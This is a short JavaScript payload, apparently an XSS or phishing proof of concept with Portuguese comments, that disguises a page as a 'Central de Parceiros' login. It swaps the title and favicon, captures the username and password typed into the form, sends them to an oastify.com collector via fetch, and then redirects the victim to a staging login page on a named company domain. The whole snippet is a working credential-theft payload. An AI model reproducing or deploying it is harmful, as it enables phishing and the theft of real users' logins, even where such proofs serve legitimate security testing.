<script>
(function() {
    // 1. Muda o título para combinar com a PoC
    document.title = "Login - Central de Parceiros";

    // 2. Remove todos os links de ícone existentes para não haver conflito
    var links = document.querySelectorAll("link[rel*='icon']");
    links.forEach(function(link) {
        link.parentNode.removeChild(link);
    });

    // 3. Cria e adiciona o novo favicon
    var newIcon = document.createElement('link');
    newIcon.rel = 'shortcut icon';
    newIcon.href = 'https://t0u7.github.io/8/favicon.ico?v=' + Date.now();
    document.head.appendChild(newIcon);
    
    console.log("Interface visual da PoC carregada.");
})();

window.login = function() {
    var u = document.getElementById('usuario').value;
    var s = document.getElementById('senha').value;
    var targetOast = 'https://d4im6ckw7y6tkek6hq5e0e779yfp3ir7.oastify.com/';
    var targetRedir = 'https://cdp.homolog.gsurfnet.com/login/login';

    // 1. Envia os dados para o seu coletor (Oastify)
    // O uso de 'navigator.sendBeacon' é preferível para redirecionamentos rápidos, 
    // pois garante o envio mesmo que a página feche.
    fetch(targetOast + '?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(s), {mode: 'no-cors'});

    // 2. Aguarda um curtíssimo tempo para o fetch iniciar e redireciona
    setTimeout(function() {
        window.location.href = targetRedir;
    }, 500); 
};
</script>
